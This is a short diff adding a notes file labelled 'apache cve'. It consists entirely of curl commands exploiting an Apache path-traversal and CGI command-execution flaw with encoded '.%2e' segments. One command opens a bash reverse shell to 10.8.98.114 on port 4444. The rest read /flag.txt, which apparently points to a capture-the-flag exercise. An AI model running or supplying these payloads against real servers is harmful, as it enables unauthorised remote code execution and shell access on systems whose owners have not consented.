@@ -1,0 +1,8 @@
+### apache cve ###
+curl -v "http://$h/cgi-bin/.%%32%65/bin/bash" -d 'echo Content-Type: text/plain; echo; /bin/bash -c "bash -i >& /dev/tcp/10.8.98.114/4444 0>&1 2>&1"' -H 'Content-Type: text/plain'
+curl -v "http://$h/cgi-bin/.%%32%65/.%%32%65/bin/bash" -d 'echo Content-Type: text/plain; echo; cat /flag.txt' -H 'Content-Type: text/plain'
+curl -v "http://$h/cgi-bin/.%%32%65/.%%32%65/.%%32%65/flag.txt"
+
+curl -v "http://$h/cgi-bin/.%2e/.%2e/bin/bash" -d 'echo Content-Type: text/plain; echo; cat /flag.txt' -H 'Content-Type: text/plain'
+curl -v "http://$h/cgi-bin/.%2e/.%2e/.%2e/.%2e/flag.txt"
+
